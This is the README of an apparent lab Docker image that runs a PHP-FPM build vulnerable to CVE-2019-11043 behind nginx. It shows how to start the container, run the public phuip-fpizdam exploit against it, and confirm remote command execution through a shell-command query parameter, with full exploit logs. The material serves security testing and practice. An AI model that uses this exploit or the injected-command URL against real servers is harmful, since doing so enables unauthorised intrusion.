A docker image with a vulnerable version of PHP-FPM (CVE-2019-11043) and nginx.

# Run
`docker run --rm -p8080:80 akamajoris/cve-2019-11043`
You should be able to access the web application at http://your-ip:8080/.

# Exploitation

Build a binary from `https://github.com/neex/phuip-fpizdam`, then

```

root@debian:~/gopath/bin# curl "localhost:8080/?a=/bin/sh+-c+'which+which'"
1
root@debian:~/gopath/bin#./phuip-fpizdam http://localhost:8080/index.php
2019/10/24 08:53:00 Base status code is 200
2019/10/24 08:53:00 Status code 502 for qsl=1765, adding as a candidate
2019/10/24 08:53:00 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2019/10/24 08:53:00 Attack params found: --qsl 1755 --pisos 182 --skip-detect
2019/10/24 08:53:00 Trying to set "session.auto_start=0"...
2019/10/24 08:53:00 Detect() returned attack params: --qsl 1755 --pisos 182 --skip-detect <-- REMEMBER THIS
2019/10/24 08:53:00 Performing attack using php.ini settings...
2019/10/24 08:53:00 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2019/10/24 08:53:00 Trying to cleanup /tmp/a...
2019/10/24 08:53:00 Done!
root@debian:~/gopath/bin# curl "localhost:8080/?a=/bin/sh+-c+'which+which'"
/usr/bin/which
```


